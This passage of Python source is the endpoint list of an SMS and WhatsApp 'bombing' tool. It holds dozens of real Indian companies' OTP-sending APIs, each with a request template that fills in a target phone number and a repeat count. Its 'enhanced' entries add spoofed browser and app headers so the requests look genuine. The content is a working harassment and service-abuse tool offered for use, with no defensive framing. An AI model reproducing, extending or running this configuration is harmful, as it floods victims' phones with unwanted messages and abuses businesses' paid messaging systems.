        "category": "voice"
    }
]

# =============== WHATSAPP BOMBING APIS (6 APIs) ===============
WHATSAPP_APIS = [
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
        "count": 10,
        "category": "whatsapp"
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}',
        "count": 10,
        "category": "whatsapp"
    },
    {
        "name": "Stratzy WhatsApp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}',
        "count": 10,
        "category": "whatsapp"
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10,
        "category": "whatsapp"
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}',
        "count": 10,
        "category": "whatsapp"
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}',
        "count": 10,
        "category": "whatsapp"
    }
]

# =============== NEW SMS APIS (55 APIs) ===============
NEW_SMS_APIS = [
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda phone: f"mobile_number={phone}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile_no=%2B91{phone}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile={phone}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "PenPencil V3",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "BigCash",
        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "WorkIndia",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "MamaEarth",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "HomeTriangle",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Wellness Forever",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "HealthMug",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Vyapar",
        "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Kredily",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Tata Motors",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "MyGov",
        "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "CodFirm",
        "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Swipe",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "More Retail",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Country Delight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "AstroSage",
        "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Rapido",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "TooToo",
        "url": "https://tootoo.in/graphql",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "ConfirmTkt",
        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 5,
        "category": "sms"
    },
    {
        "name": "BetterHalf",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Charzer",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Nuvama Wealth",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 5,
        "category": "sms"
    }
]

# =============== ENHANCED APIS (43 APIs) ===============
ENHANCED_APIS = [
    {
        "name": "Lenskart SMS Enhanced",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "X-API-Client": "mobilesite",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "GoPink Cabs Enhanced",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "Origin": "https://www.gopinkcabs.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f"check_mobile_number=1&contact={phone}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Shemaroome Enhanced",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "Origin": "https://www.shemaroome.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f"mobile_no=%2B91{phone}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "KPN Fresh WEB",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "content-type": "application/json",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "origin": "https://www.kpnfresh.com",
            "referer": "https://www.kpnfresh.com/"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}',
        "count": 5,
        "category": "whatsapp"
    },
    {
        "name": "KPN Fresh AND",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}',
        "count": 5,
        "category": "whatsapp"
    },
    {
        "name": "BikeFixup Enhanced",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "Dart/3.6 (dart:io)"
        },
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Rappi Enhanced",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}',
        "count": 5,
        "category": "whatsapp"
    },
    {
        "name": "Stratzy Phone OTP",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "referer": "https://stratzy.in/login"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Stratzy WhatsApp Enhanced",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "referer": "https://stratzy.in/login"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}',
        "count": 5,
        "category": "whatsapp"
    },
    {
        "name": "WellAcademy Enhanced",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://wellacademy.in"
        },
        "data": lambda phone: f'{{"contact_no":"{phone}"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Hungama Enhanced",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}',
        "count": 5,
        "category": "sms"
    },
    {
        "name": "ServeTel Enhanced",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
        },
        "data": lambda phone: f"mobile_number={phone}",
        "count": 5,
        "category": "sms"
    },
    {
        "name": "Meru Cab Enhanced",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda phone: f"mobile_number={phone}",
